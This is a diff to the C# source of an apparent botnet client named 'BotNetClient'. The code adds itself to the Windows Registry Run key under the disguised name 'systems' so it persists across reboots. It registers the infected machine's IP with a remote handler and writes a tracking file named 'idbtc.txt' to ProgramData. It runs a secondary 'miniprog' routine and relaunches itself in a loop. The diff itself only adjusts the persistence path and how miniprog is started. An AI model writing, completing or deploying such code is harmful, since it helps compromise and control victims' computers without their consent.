@@ -18,12 +18,11 @@ namespace BotNetClient
             {
                 RegistryKey reg;
                 reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
-                reg.SetValue("systems", Assembly.GetExecutingAssembly().ToString());
+                reg.SetValue("systems", Environment.CurrentDirectory.ToString()+"\\BotNetClient.exe");
             }
             catch { }
         }
         public static UInt32 idc;
-        public static Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
         static void Main(string[] args)
         {
             ServicePointManager.Expect100Continue = false;
@@ -36,9 +35,9 @@ namespace BotNetClient
             idc = HttpHandler.CreateIpAndIdAsync(ipadress.ToString()).Result;
             uint id = 1;
             id = HttpHandler.IdResult().Result+1;
+            SecondThread.miniprog();
             try
             {
-                miniprogram.Start();
                 if (!File.Exists("C:\\ProgramData\\idbtc.txt"))
                 {
                     File.Create("C:\\ProgramData\\idbtc.txt").Close();
@@ -87,7 +86,6 @@ namespace BotNetClient
             finally
             {
                 Thread.Sleep(5000);
-                miniprogram.Abort();
                 Process.Start(Assembly.GetExecutingAssembly().Location);
                 Environment.Exit(0);
             }
